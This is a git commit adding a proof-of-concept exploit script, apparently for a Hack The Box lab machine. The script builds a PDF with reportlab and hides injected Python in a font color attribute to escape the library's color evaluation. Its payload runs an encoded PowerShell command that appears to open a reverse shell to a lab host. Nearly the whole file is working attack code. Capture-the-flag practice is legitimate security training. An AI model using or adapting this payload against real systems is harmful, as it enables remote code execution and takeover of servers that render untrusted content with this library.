ee8e34994c9578f99786b22df898788a9c579e79
Chris-Coleongco <christien.coleongco@gmail.com>
2024-05-16 00:03:16 -0400

    WOOOOOOOOOOOO

---
+++ HTB/yoyo/solarlab/PoC/explo.py
@@ -0,0 +1,51 @@
+from reportlab.platypus import SimpleDocTemplate, Paragraph
+from io import BytesIO
+stream_file = BytesIO()
+content = []
+
+def add_paragraph(text, content):
+    """ Add paragraph to document content"""
+    content.append(Paragraph(text))
+
+def get_document_template(stream_file: BytesIO):
+    """ Get SimpleDocTemplate """
+    return SimpleDocTemplate(stream_file)
+
+def build_document(document, content, **props):
+    """ Build pdf document based on elements added in `content`"""
+    document.build(content, **props)
+
+
+
+doc = get_document_template(stream_file)
+#
+# THE INJECTED PYTHON CODE THAT IS PASSED TO THE COLOR EVALUATOR
+#[
+#    [
+#        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
+#        for Word in [
+#            orgTypeFun(
+#                'Word',
+#                (str,),
+#                {
+#                    'mutated': 1,
+#                    'startswith': lambda self, x: False,
+#                    '__eq__': lambda self, x: self.mutate()
+#                    and self.mutated < 0
+#                    and str(self) == x,
+#                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
+#                    '__hash__': lambda self: hash(str(self)),
+#                },
+#            )
+#        ]
+#    ]
+#    for orgTypeFun in [type(type(1))]
+#]
+
+add_paragraph("""
+            <para>
+              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
+                exploit
+                </font>
+            </para>""", content)
+build_document(doc, content)
